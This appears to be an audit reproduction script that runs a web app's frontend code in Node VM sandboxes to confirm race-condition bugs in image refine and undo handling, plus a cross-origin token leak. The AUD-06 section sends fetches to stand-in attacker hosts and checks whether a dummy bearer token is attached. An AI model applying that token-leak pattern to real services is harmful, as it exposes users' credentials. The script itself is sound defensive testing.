// Execute the actual app.js in a VM, stub only DOM/rendering/network dependencies.
// Run: node docs/audits/20260927/frontend_repro.cjs
// 'defect_reproduced: true' means a current bug was observed, not fixed.
const fs = require('node:fs');
const vm = require('node:vm');
const path = require('node:path');
const source = fs.readFileSync(path.resolve(__dirname, '../../../app.js'), 'utf8');
function setup() {
  const elements = new Map();
  const document = {
    getElementById(id) {
      if (!elements.has(id)) elements.set(id, {value: '', disabled: false, classList: {
        add() {}, remove() {}, toggle() {}, contains() {return false;}
      }, focus() {}});
      return elements.get(id);
    },
    querySelectorAll() {return [];}
  };
  const c = vm.createContext({document, window: {}, location: {hostname: 'audit', port: ''},
    console, setTimeout, clearTimeout, setInterval, clearInterval, URL, AbortController});
  vm.runInContext(source, c);
  vm.runInContext(`
    for (const name of ['showToast','showGenerateNoticeBanner','showGenerateErrorBanner',
      'clearGenerateBannerForNewRequest','updateRefineControls','showRefinedImage',
      'renderEditorFormats','applyEditorFormatInputs','applyEditorFormatLocks',
      'updateAIBtnRoleHint','renderCoverAsis','renderYtAsis']) {
      globalThis[name] = () => {};
    }
    editorFormat = () => ({inputs: '', hides: {}, label: 'test'});
    broadcastHoleForApi = () => '';
    state.refineParameters = {provider:'gemini',aspect_ratio:'16:9',image_size:'1K',
      density:'simplified',safe_frame:false,safe_frame_profile:'記者'};
    state.refineSource = {base64:'source-A', mimeType:'image/png'};
    state.refineDisplay = {image_data_base64:'display-A',mime_type:'image/png',
      disclaimer_kind:'ai',disclaimer_corner:'lower_left'};
    document.getElementById('refineInput').value = 'make brighter';
    globalThis.pending = [];
    fetch = (_url, options) => new Promise(resolve => pending.push({resolve, body:JSON.parse(options.body)}));
    globalThis.reply = (i, name) => pending[i].resolve({ok:true,json:async()=>({
      image_data_base64:name,source_image_base64:name,mime_type:'image/png',
      source_mime_type:'image/png',disclaimer_kind:'ai'})});
  `, c);
  return c;
}
async function run() {
  let c = setup();
  await vm.runInContext(`(async()=>{
    const p = handleRefine();
    setEditorFormat('default');
    const clearedBeforeReply = state.refineSource === null;
    reply(0,'old-result'); await p;
    console.log('AUD-02',JSON.stringify({clearedBeforeReply,
      actual:state.refineSource?.base64,
      defect_reproduced:clearedBeforeReply && state.refineSource?.base64==='old-result'}));
  })()`, c);
  c = setup();
  await vm.runInContext(`(async()=>{
    const first = handleRefine();
    const second = handleRefine();
    console.log('AUD-03',JSON.stringify({request_count:pending.length,
      defect_reproduced:pending.length===2}));
    reply(1,'newer-result'); await second;
    reply(0,'older-result'); await first;
    console.log('AUD-03-order',JSON.stringify({actual:state.refineSource.base64,
      defect_reproduced:state.refineSource.base64==='older-result'}));
  })()`, c);
  c = setup();
  await vm.runInContext(`(async()=>{
    state.refineStack = [{source:{base64:'undo-source',mimeType:'image/png'},
      display:{image_data_base64:'undo-display',mime_type:'image/png'},parameters:state.refineParameters}];
    const p = restampDisclaimer();
    undoRefine();
    reply(0,'restamped-old-version'); await p;
    console.log('AUD-05',JSON.stringify({source:state.refineSource.base64,
      display:state.refineDisplay.image_data_base64,
      defect_reproduced:state.refineSource.base64==='undo-source' &&
        state.refineDisplay.image_data_base64==='restamped-old-version'}));
  })()`, c);
  const sent = [];
  const authWindow = {Clerk:{session:{getToken:async()=> 'AUDIT_DUMMY_TOKEN'}}};
  authWindow.fetch = async (input, init) => {
    if (input === '/auth-config.json') return {json:async()=>({enabled:true,frontendApi:'audit.invalid'})};
    sent.push({url:input,authorization:init?.headers?.get('Authorization')});
    return {};
  };
  const auth = vm.createContext({window:authWindow,fetch:authWindow.fetch,
    location:{origin:'https://trusted.invalid'},Headers,
    document:{createElement:()=>({setAttribute(){}}),head:{appendChild(){}}}});
  vm.runInContext(fs.readFileSync(path.resolve(__dirname,'../../../static/auth-bootstrap.js'),'utf8'),auth);
  await authWindow.fetch('https://trusted.invalid.attacker.invalid/endpoint');
  await authWindow.fetch('//attacker.invalid/endpoint');
  console.log('AUD-06',JSON.stringify({external_requests_with_dummy_token:
    sent.filter(x=>x.authorization==='Bearer AUDIT_DUMMY_TOKEN').length,
    defect_reproduced:sent.length===2 && sent.every(x=>x.authorization==='Bearer AUDIT_DUMMY_TOKEN')}));
}
run().catch(e => {console.error(e); process.exitCode=1;});
